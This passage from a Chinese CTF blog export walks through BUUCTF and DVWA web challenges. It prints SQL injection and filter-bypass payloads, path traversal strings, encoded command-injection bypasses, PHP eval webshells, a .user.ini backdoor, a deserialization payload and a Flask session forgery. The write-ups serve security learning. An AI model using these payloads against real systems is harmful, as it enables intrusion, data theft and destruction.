bp抓包试试sql注入 经测试发现单引号可以闭合 并且他是有三列 直接注，爆库 ?username=-1’+union+select+1,version(),database()%23&amp;password=49015dfe2bc6add029ba98b1613a2493 爆表 username=-1’+union+select+1,version(),group_concat(table_name)+from+information_schema.tables+where+table_schema=database()%23&amp;password=49015dfe2bc6add029ba98b1613a2493 爆列 username=-1’+union+select+1,version(),group_concat(column_name)+from+information_schema.columns+where+table_name=’l0ve1ysq1’%23&amp;password=49015dfe2bc6add029ba98b1613a2493 爆数据 username=-1’+union+select+1,version(),group_concat(username,’-‘,password)+from+l0ve1ysq1%23&amp;password=49015dfe2bc6add029ba98b1613a2493","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"http://example.com/tags/buuctf/"},{"name":"SQLi","slug":"SQLi","permalink":"http://example.com/tags/SQLi/"}]},{"title":"buuctf_web_1","slug":"buuctf/buuctf-web-1","date":"2020-08-19T11:52:51.000Z","updated":"2021-05-23T11:06:23.122Z","comments":true,"path":"2020/08/19/buuctf/buuctf-web-1/","link":"","permalink":"http://example.com/2020/08/19/buuctf/buuctf-web-1/","excerpt":"前言​ 学如逆水行舟，不进则退","text":"前言​ 学如逆水行舟，不进则退 [HCTF 2018]WarmUp[强网杯 2019]随便注[极客大挑战 2019]EasySQL1[极客大挑战 2019]Havefun[极客大挑战 2019]Secret File [GXYCTF2019]Ping Ping Ping[ACTF2020 新生赛]Exec 1[RoarCTF 2019]Easy Calc 1[极客大挑战 2019]PHP 1[极客大挑战 2019]Http 1[极客大挑战 2019]Upload 1[极客大挑战 2019]BabySQL 1[HCTF 2018]admin1[ACTF2020 新生赛]Upload1[ACTF2020 新生赛]BackupFile1[SUCTF 2019]CheckIn1 [HCTF 2018]WarmUp打开source.php后，得到源码: 123456789101112131415161718192021222324252627282930313233343536373839 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; //in_array()查找字符串中是否存在指定的值 return true; &#125; $_page = mb_substr($page, 0 ,mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)); //mb_substr(str,0,2)函数返回字符串的一部分 //mb_strpos(str1,str2)返回str2在str1中首次出现的位置 if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr($_page, 0 ,mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 这里面又有一个hint.php，打开之后只有一句话。flag not here, and flag in ffffllllaaaagggg。 看来是要想办法读取到ffffllllaaaagggg的内容，来拿到flag。 先看看下面的主函数： 1234567if (! empty($_REQUEST[&#x27;file&#x27;])&amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])&amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; if (! empty($_REQUEST[&#39;file&#39;])&amp;&amp; is_string($_REQUEST[&#39;file&#39;])&amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])中要求emmm::checkFile($_REQUEST[&#39;file&#39;]返回true，只要能返回true，就能include $_REQUEST[&#39;file&#39;];。 来看看emmm::checkFile($_REQUEST[‘file’]函数，在这个函数中 1234$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];if (in_array($page, $whitelist)) &#123; //in_array()查找字符串中是否存在指定的值 return true; &#125; whitelist是个白名单，只允许source.php和hint.php。这个if判断，会判断参数中是否含有source.php和hint.php。如果存在则返回true，如果失败则执行下面的代码： 123$_page = mb_substr($page, 0 ,mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)); //mb_substr(str,0,2)函数返回字符串的一部分 //mb_strpos(str1,str2)返回str2在str1中首次出现的位置 这段代码，首先会通过mb_strpos()函数返回在page中?第一次出现的位置，然后通过mb_substr()函数截取这一部分的字符串，赋值给_page。然后再进入新一轮的if判断,此时_page如果是白名单中的字符串，返回true，如果还没有，则再通过urldecode()解码以及再次进行截取，进入if判断，成功返回true。 可以发现，这里有两个if都能返回true，我们只需要满足一处if条件，然后返回true，就可以利用 ../ 来穿越目录读取到我们想要的文件。 第一处 构造?file=source.php?../../../../../../../../../../ffffllllaaaagggg，经过mb_substr()时，就会只剩source.php，就会返回true，然后通过../即可穿越目录读取flag 第二处 第二处是在经过urldecode()解码之后再返回true，这样的话需要将?进行两次url编码， ?file=source.php%25%33%46/../../../../../../ffffllllaaaagggg 这样传入浏览器解码一次，?file=source.php%3F/../../../../../../ffffllllaaaagggg urldecode()再解码一次，?file=source.php?/../../../../../../ffffllllaaaagggg 再经过截取，即可如上面一样，返回true。 [强网杯 2019]随便注作为一个彩笔，这题触及我的知识盲区了。 开始的时候还是很愉快的，就SQL注入的老套路，1&#39; order by 2#猜出两列之后，上1&#39; union select 1,database()#之后，出现了return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);，过滤了很多这么多关键字，大写、双写也不行。网上找了找wp。 原来是堆叠注入 原理 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 0’;show databases;# 0’;show tables;# 0’;show columns from words;# 查询1919810931114514表中所有列1’;show columns from 1919810931114514;#(字符串为表名操作时要加反引号) 根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id方法一(修改数据库结构):这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段 11&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);# 这段代码的意思是将words表名改为words1，1919810931114514表名改为words，将现在的words表中的flag列名改为id然后用1&#39; or 1=1 #得到flag [极客大挑战 2019]EasySQL1使用万能密码即可得到flag，username=1&#39; or 1#&amp;password=1 [极客大挑战 2019]Havefun查看源码 1234567&lt;?php $cat=$_GET[&#x27;cat&#x27;]; echo $cat; if($cat==&#x27;dog&#x27;)&#123; echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;; &#125;?&gt; 提交?cat=dog，即可。 [极客大挑战 2019]Secret File经过一系列的页面跳转，抓包，得到secret3.php，在里面得到源码： 1234567891011&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag放在了flag.php里?&gt; 可以看到这段代码中没有过滤php://，并且提示flag在flag.php中，所以使用php伪协议读取?file=php://filter/read=convert.base64-encode/resource=flag.php得到base64解码即可。 [GXYCTF2019]Ping Ping Ping 试试ip，正常回显 试试命令执行 查看flag.php 猜测是空格被过滤了 用$IFS$1代替 查看index.php 可以看到过滤了很多字符 但是在最后我们看到了a变量，那我们是不是可以将a的值覆盖，然后进行绕过呢？ 1?ip=127.0.0.1||a=g;cat$IFS$1fla$a.php 查看源码即可 还可以对cat flag.php进行编码 构造payloadecho$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 知识点1：空格绕过 处理方法：1.全局变量 123451.$&#123;IFS&#125;2.$IFS$1 #注释：最后一句的意识是取第几个参数的意思，当没有参数的时候，就不用考虑3.重定向符：&lt;&gt;4.定义变量#cmd=$&#x27;\\x201234&#x27;&amp;&amp;echo$cmd 这个方式可以用ASCII编码，绕过所有字符限制。5.&#123;cat,flag.php&#125; //用逗号实现了空格功能 知识点2：过滤字符了链接 1234567891011echo ()|base64 -d|shecho ()| base64 -d|bash`echo ()|base64 -d&#x27;变量拼接a=l;b=s;$a$b*贪婪匹配反斜杠绕过 echo f\\lag.php编码绕过 $(printf &quot;\\154\\163&quot;) ==&gt;ls $(printf &quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;) ==&gt;cat /flag &#123;printf,&quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;&#125;|\\$0 ==&gt;cat /flag 特殊变量 1; l$@s -l;1 · 1; l$*s -l;1 1; l$ns -l;1 //n为任意数字都可以 [ACTF2020 新生赛]Exec 1很简单的命令执行 |ls |cat flag即可 [极客大挑战 2019]Knife 1 直接上菜刀连接，在根目录下有flag [RoarCTF 2019]Easy Calc 1算了一下， 试了试||、&amp;&amp;、|、&amp;、; 都不行，看看源码 说是有waf， $(“#content”).val()获取id为content的HTML标签元素的值,是JQuery$(“#content”)同document.getElementById(“content”);$(“#content”).val()同document.getElementById(“content”).value; 但是看到了calc.php，访问一下 加上num试试 url编码之后才行 但是，一输入特殊字符就forbidden，应该是waf 可是我们不知道waf如何写的，，该如何绕过呢？？其实利用PHP的字符串解析特性就能够进行绕过waf！！构造参数? num=phpinfo()（注意num前面有个空格）就能够绕过： 1? num=phpinfo() 由于“/”被过滤了，，，所以我们可以使用chr(47)来进行表示，进行目录读取： 读取flag file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) var_dump(file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) [极客大挑战 2019]PHP 1 备份网站？是暗示吗？ 扫一下网站目录试试 python3 dirsearch.py -u http://9743478f-8031-45e4-9f2d-9643a2105dc9.node3.buuoj.cn/ -e * 访问试试www.zip试试，拿到源码 index.php 12345&lt;?php include &#x27;class.php&#x27;; $select = $_GET[&#x27;select&#x27;]; $res=unserialize(@$select); ?&gt; 要get提交select，然后反序列化 class.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; 根据代码的意思，我们可以发现如果username=admin password=100然后我们再执行__destruct() 那接下来我们可以构造反序列Pyload了 123456789101112131415&lt;?php class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125;&#125;$a = new Name(&#x27;admin&#x27;, 100);var_dump(serialize($a)); ?&gt; 反序列化unserialize()的话它是会直接执行__wake up()这个魔术方法的。那我们就要想办法让这个反序列绕过__wake up()执行_\\_destruct() 而在反序列化里，当前属性个数大于实际属性个数的时候，它就会直接绕过_wake up()从而执行__destruct()的。然后我们修改一下序列化字符串（name：2改成3） 1?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125; 尝试之后居然不行？ 然后我们又意识到，这个变量是private private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字 段名在序列化时，类名和字段名前面都会加上\\0的前缀。字符串长度也包括所加前缀的长度 于是我们在构造一回pyload: ?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;} [极客大挑战 2019]Http 1看看源码 发现secret.php 抓包修改refer头 提示变成了Please use “Syclover” browser 修改User-agent: Syclover browser No!!! you can only read this locally!! 有毒？ 修改X-Forwoeded-For: 127.0.0.1，得到flag [极客大挑战 2019]Upload 1上传正常图片 上传了个一句话木马，也是这样， 继续尝试，换个GIF马试试，上传shell123.jpg，回显不一样了，看来是需要GIF 更改继续尝试 继续尝试php3、php5、pht都失败 最后发现phtml可以 回显再次变成了说包含&lt;? 更改木马内容为 @eval($_POST['cmd']); 再次上传 尝试访问 菜刀连接，找到flag [极客大挑战 2019]BabySQL 1尝试万能密码username=1+or+1%3D1&amp;password=1 单引号闭合试试 注释掉password后面的试试，，，，，额，还是不对 换之前的用户名admin 回显了密码 猜测列数 or被删除了，双写试试，还是被去掉了，大写也不行 用union select 试试 又被删除了吗？ 双写试试 ?username=admin’+ununionion+selselectect+1,2,3%23&amp;password=1 回显正常 发现有三列 爆库 ?username=-1’+ununionion+selselectect+1,2,database()%23&amp;password=1 爆表 发现from information_schema，where都被过滤，双写试试 ?username=-1’+ununionion+selselectect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema=database()%23&amp;password=1 爆列 1?username=-1&#x27;+ununionion+selselectect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_name=&quot;b4bsql&quot;%23&amp;password=1 查数据 ?username=-1’+ununionion+selselectect+1,2,group_concat(username,”-“,passwoorrd)+frfromom+b4bsql%23&amp;password=1 [HCTF 2018]admin1注册之后，登录 查看源码 只写着说youarenotadmin，要想办法变成admin了 于是就使用账号admin密码123发现直接就能等进去了。而且首页就显示出falg了，不感相信退出去输入密码123123发现显示密码错误。推测admin的密码真的是123。感觉考点肯定不是弱密码，估计是作者没太在意，假装不知道密码继续做下去。 在登陆的情况下能访问三个页面index、posts、edit、change。逐个看看有没有什么能利用的地方。 ​ index页面和之前的index页面查看源代码是一样的。​ posts页面进入只会显示404，就算再后面新增了文章也是一样。​ edit页面是一个类似博客编写页面，有两个文本框，但试了一下XSS都被过滤了。​ change页面是一个修改密码的页面。可能存在逻辑漏洞，尝试一下。 ​ 发现不需要输入之前的密码直接输入新密码就行，这样就不存在多步骤校验可能存在的逻辑绕过。 ​ ​ 查看报文发现报文中没有写用户名，里面只有一个新密码。证明用户名是通过session来获取的，所以也不存在中间截获修改的漏洞。但在修改密码页面的源代码中发现提示了我们整个工程的Git地址。 拿到源码 123456789101112&#123;% include(&#x27;header.html&#x27;) %&#125;&#123;% if current_user.is_authenticated %&#125;&lt;h1 class=&quot;nav&quot;&gt;Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;&lt;/h1&gt;&#123;% endif %&#125;&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;&lt;h1 class=&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;/h1&gt;&#123;% endif %&#125;&lt;!-- you are not admin --&gt;&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;&#123;% include(&#x27;footer.html&#x27;) %&#125; 可以从上面index页面模板看出只要从session中得到的值name为admin就会显示flag。 查阅资料得知，flask 是非常轻量级的 Web框架 ，其 session 存储在客户端中，也就是说其实只是将相关内容进行了加密保存到session中。和服务端的session不同，服务端的session保存在服务端中，依靠客户端cookie值中的sessionId来进行识别。本身sessionId是没有价值的，而客户端的session是可以被截取破解后得到有价值的原文。在网上找了一个解密的脚本： 123456789101112131415161718192021222324252627282930313233343536#index.html#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b&#x27;.&#x27;, 1) payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1) decompress = False if payload.startswith(b&#x27;.&#x27;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(&#x27;Could not base64 decode the payload because of &#x27; &#x27;an exception&#x27;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(&#x27;Could not zlib decompress the payload before &#x27; &#x27;decoding the payload&#x27;) return session_json_serializer.loads(payload)if __name__ == &#x27;__main__&#x27;: s = &quot;.eJw9kMGKwkAQRH9l6bOHJGYvgoeVSSRCd1AmCdMXcTUmM9l2ISqaEf99gyye6lDFo6oesD329bmF2aW_1hPY2gPMHvDxDTMwkgy5LmKjM48qG3JVxOhLy24fYmViUqOqRWsEQ_LJ3bhuyi4VE43ZKm1Z4Y1V-kOuuKOkNtelY2Ui41qLah1QVQR5VVqjvzxV2UCqFF6WkquFxWhjWXU-r4qB_KojnUTsmph0EbCUbux0Yz3mXTJlyebwnMD-3B-3l9-uPr0noN6PE8ixxk_UGJOsb7wcq4kJaMkd641D10SkW8t65civB9PMXzgru6Z-k0guAf47p52MBuwOYk8hTOB6rvvXcRAG8PwD9uBt8Q.X8yKzg.NjWoGG8XKlG6tjeTodQ8RB7yquQ&quot; print(decryption(s.encode())) 可以看到能解密出来原来的内容，能看到很明显一个是name字段正是我们之前注册的test。那只要改一下这个值，然后重新加密一下就可以了。加密的脚本看大佬的writeup上有个地址：https://github.com/noraj/flask-session-cookie-manager。拿到后直接使用即可。加密还需要一个值SECRET_KEY，这个在config.py中能看到。 伪造flask session还需要一个SECRET_KEY 我们发现config.py中存在，SECRET_KEY = os.environ.get(‘SECRET_KEY’) or ‘ckj123’flask session加密脚本https://github.com/noraj/flask-session-cookie-manager payload:伪造的session 1&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;2ff34a5077d2f711c7aa5fb35b61ebe2d8cf4081a56609f46c43d95e51de0efa5713b6d78b48664e4d4bbf4aabb1fd6b6484b97d2b48997ce7a83878b78781d1&#x27;, &#x27;csrf_token&#x27;: b&#x27;44463a5670f0c0ad61ab0d2dc0ae725a14808b81&#x27;, &#x27;image&#x27;: b&#x27;MAuE&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125; 替换掉原来的session即可 [ACTF2020 新生赛]Upload1 上传正常图片返回路径，并且可以访问 上传php文件，回显如上，应该是前端的白名单校验，更改后缀名上传 可见知识校验后缀名，但是访问之后，php未被解析 后来发现phtml可以绕过，但是php没解析？ 换成js system(\"cat /flag\"); [ACTF2020 新生赛]BackupFile1 ​ 在index.php.bak中找到源码 1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo &quot;Try to find out source file!&quot;;&#125; 传入一个key，这个key必须是数字，但是还必须要和str相等，按理来说是不可能的，但是这里用的是==，php中存在弱比较问题，即123和123xxxxx是相等的，它只会取字符串前面的数字进行比较 所以payload：?key=123 [SUCTF 2019]CheckIn1 提交一个正常文件 显示有&lt;?，不能写php马，写js的马，又提示内容不是图片，所以再加上GIF89a头，即可绕过， 菜刀连不上？。。。。。。 百度一下，哦，是要利用.user.ini文件 条件： 1、服务器脚本语言为PHP 2、服务器使用CGI／FastCGI模式 3、上传目录下要有可执行的php文件 上传.user.ini绕过黑名单检验 123GIF89a //绕过exif_imagetype()auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。auto_append_file=a.jpg //解析后进行包含 优势：跟.htaccess后门比，适用范围更广，nginx/apache/IIS都有效，而.htaccess只适用于apache 上传这样的一个ini文件 12GIF89aauto_prepend_file=shell.jpg 再上传我们之前的shell.jpg 访问index.php， 注意：上传目录下要有一个正常的php文件，这里为index.php 菜刀连接 一直连不上，，换个马 system(\"cat /flag\"); 直接读取","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"http://example.com/tags/buuctf/"}]},{"title":"绕过非英文字母和数字getshell","slug":"大学CTF/绕过非英文字母和数字getshell","date":"2019-10-16T07:55:41.000Z","updated":"2019-10-16T08:01:10.363Z","comments":true,"path":"2019/10/16/大学CTF/绕过非英文字母和数字getshell/","link":"","permalink":"http://example.com/2019/10/16/%E5%A4%A7%E5%AD%A6CTF/%E7%BB%95%E8%BF%87%E9%9D%9E%E8%8B%B1%E6%96%87%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97getshell/","excerpt":"前言绕过不是英文字母，不是数字的验证。 1preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) : int preg_match()返回 pattern 的匹配次数。","text":"前言绕过不是英文字母，不是数字的验证。 1preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) : int preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。 正文题目源码 1234567891011121314151617&lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;highlight_file(__FILE);// ?&gt; 可以看到这段代码中，要求而传入的参数不能带有数字和英文字母， 所以我们要绕过A-Za-z0-9这些常规数字、字母字符串的传参。将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符，并且字符串长度小于40。然后再利用 PHP允许动态函数执行的特点，拼接处一个函数，然后执行这个函数getshell。 如何构造 在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。 123&lt;?php echo &quot;A&quot;^&quot;?&quot;;?&gt; A的ASCII值是65，对应的二进制值是01000001 ?的ASCII值是63，对应的二进制值是00111111 异或的二进制的值是10000000，对应的ASCII值是126，对应的字符串的值就是~了 以此可以构造webshell 12345&lt;?php@$_++; //$_=NULL=0 $_++=1$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;); //_POST$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);?&gt; 为了节省字符长度，这里字符可以一起异或使用 1234&lt;?phpvar_dump(&quot;#./|&#123;&quot;^&quot;|~`//&quot;); //_POSTvar_dump(&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;); //_GET?&gt; 最终payload 1$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=print_r(scandir(&#x27;/&#x27;)) 参考文章 参考文章","categories":[],"tags":[]},{"title":"条件竞争","slug":"大学CTF/条件竞争","date":"2019-10-16T07:33:45.000Z","updated":"2019-10-16T07:34:19.991Z","comments":true,"path":"2019/10/16/大学CTF/条件竞争/","link":"","permalink":"http://example.com/2019/10/16/%E5%A4%A7%E5%AD%A6CTF/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/","excerpt":"前言见过很多次了，又来一个","text":"前言见过很多次了，又来一个 正文条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。 Ayrain 尝试输入之后，返回一个文件路径 尝试访问之后，显示you are too slow 很明显这就是要求你快速的访问那个返回的文件路径，引起条件竞争 使用burpsuite很方便 一、抓第一个包 首先抓到第一个包，然后send to Intruder，clear掉变量符号 然后设置payloads，设置null payload和连续发包 点击start attack开始发包 二、抓取第二个包 访问返回的路径，抓包-&gt;send to Intruder 设置如下 start attack开始发包 查看响应包，拿到flag 相关文章","categories":[],"tags":[]},{"title":"不知列名SQL注入","slug":"大学CTF/不知列名SQL注入","date":"2019-10-14T03:35:38.000Z","updated":"2019-10-14T03:48:10.875Z","comments":true,"path":"2019/10/14/大学CTF/不知列名SQL注入/","link":"","permalink":"http://example.com/2019/10/14/%E5%A4%A7%E5%AD%A6CTF/%E4%B8%8D%E7%9F%A5%E5%88%97%E5%90%8DSQL%E6%B3%A8%E5%85%A5/","excerpt":"前言cumtCTF2019 Final中的一个web题","text":"前言cumtCTF2019 Final中的一个web题 eeeeee……… 因为太迟了，平台已经关闭了， 参考文章 构造payload ununionion selselectect 1,(e.2),3 from (selselectect * from (selselectect 1)a,(selselectect 2)b ununionion selselectect * from f1ag1nit)e limit 1,1 –+ ?id=-1’ uniunionon seleselectct * from (seleselectct 1)x,(seleselectct 2)y,(seleselectct c.2 from (seleselectct * from (seleselectct 1)a,(seleselectct 2)b uniunionon seleselectct * from f1ag1nit)c limit 1,2)z –+","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"cumtCTF","slug":"cumtCTF","permalink":"http://example.com/tags/cumtCTF/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"DVWA练习","slug":"靶场/DVWA练习","date":"2019-10-03T01:29:16.000Z","updated":"2019-11-03T14:05:09.797Z","comments":true,"path":"2019/10/03/靶场/DVWA练习/","link":"","permalink":"http://example.com/2019/10/03/%E9%9D%B6%E5%9C%BA/DVWA%E7%BB%83%E4%B9%A0/","excerpt":"前言一个小型靶场。 Brute ForceDVWA Security：low这题的名字是爆破，那我们就爆破一下试试","text":"前言一个小型靶场。 Brute ForceDVWA Security：low这题的名字是爆破，那我们就爆破一下试试 先随便提交一个密码和用户名，打开代理，bp抓包 然后，发送到Intruder模块，进行如下设置 然后载入字典 然后start attack，在结果中找到长度特殊的就是正确的用户名和密码 源码 12345678910111213141516171819202122232425&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Get username $user = $_GET[ &#x27;username&#x27; ]; // Get password $pass = $_GET[ &#x27;password&#x27; ]; $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful $html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 可以看出来没有对username和password进行任何过滤，这里存在SQL注入漏洞。 username=admin&#39; or &#39;1&#39;=&#39;1或者username=admin&#39;#，即可成功登入 DVWA Security：medium源码 12345678910111213141516171819202122232425262728&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; 